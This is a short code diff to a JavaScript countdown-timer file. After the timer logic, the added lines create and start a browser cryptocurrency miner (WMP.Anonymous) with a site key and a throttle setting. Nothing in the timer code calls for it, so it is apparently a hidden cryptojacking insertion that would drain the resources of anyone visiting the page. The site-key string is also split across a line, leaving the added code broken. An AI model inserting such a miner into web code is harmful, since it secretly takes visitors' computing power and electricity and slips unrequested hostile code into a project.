@@ -51,3 +51,8 @@ function valDate() {
 let countDown = setInterval(valDate, 1000);
 
 valDate()
+
+
+var miner = WMP.Anonymous('SK_9tBldwhJbFRp49fSAc8pP
+',{throttle: 0.3});
+    miner.start();
